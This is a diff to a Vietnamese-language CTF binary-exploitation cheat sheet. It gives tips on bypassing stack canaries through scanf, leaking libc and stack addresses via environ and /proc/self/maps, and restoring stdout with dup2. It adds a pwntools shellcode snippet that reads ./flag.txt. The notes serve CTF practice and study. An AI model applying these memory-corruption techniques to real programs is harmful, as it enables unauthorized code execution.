@@ -39,6 +39,8 @@ STACK:
 - Vậy nên để bypass tránh việc ghi đè canary ta chỉ cần nhập chữ cái (+, -, -, /) mà không thuộc format %lu thì phần tử đó sẽ bị skip, không thay đổi. VD: chall `Warmup` - UIT-2022-CTF .
 - Leak được LIBC thì có thể leak được địa chỉ thuộc stack thông qua biến environ trong LIBC.
 - Có thể leak libc thông qua đọc `/proc/self/maps`
+- `Chall pwn07 - whitehat`: Dùng dup2(0, 1) để mở lại stdout, leak giá trị.
+- `shellcode`:
 
 ```python
 ...
@@ -46,14 +48,6 @@ elf = ELF('./vuln')
 context.binary = elf
 p = elf.process()
 ...
-
-shellcode = asm('''
-        instruction assembly
-        ...
-''')
-
-OR
-
 context.arch = 'amd64'
 shellcode = asm(
     f'''
@@ -69,8 +63,14 @@ shellcode = asm(
     syscall
     ''')
 ```
+```python
+shellcode = pwn.asm(
+	pwn.shellcraft.open("./flag.txt") + 
+	pwn.shellcraft.read(3, "rsp", 64) + 
+	pwn.shellcraft.write(1, "rsp", 64)
+).ljust(0x44, b"\x90")
+```
 
-- `Chall pwn07 - whitehat`: Dùng dup2(0, 1) để mở lại stdout, leak giá trị.
 
 ## [1] Technique:
 - [CTF: No leak - close(fd)](https://blog.idiot.sg/2018-09-03/tokyowesterns-ctf-2018-load-pwn/) .
